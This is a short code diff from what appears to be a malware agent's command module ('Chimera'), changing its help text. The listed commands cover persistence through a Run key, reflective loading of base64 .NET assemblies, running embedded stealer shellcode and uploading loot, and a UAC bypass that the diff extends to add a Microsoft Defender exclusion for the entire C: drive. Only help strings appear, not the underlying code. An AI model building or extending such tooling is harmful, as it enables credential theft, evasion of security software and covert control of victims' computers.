@@ -22,7 +22,7 @@ namespace Chimera.Commands
             sb.AppendLine("persist remove           Remove persistence blob and Run key");
             sb.AppendLine("inject_assembly <b64>    Reflectively load and run a .NET assembly (base64)");
             sb.AppendLine("run_stealer              Decrypt+run embedded stealer shellcode, upload loot");
-            sb.AppendLine("bypass [cmd]             Silent UAC elevation via fodhelper registry hijack");
+            sb.AppendLine("bypass [cmd]             Silent UAC elevation + Defender exclusion for C:\\");
             sb.AppendLine("kill                     Terminate agent process");
             sb.AppendLine("help                     Show this help");
             return sb.ToString();
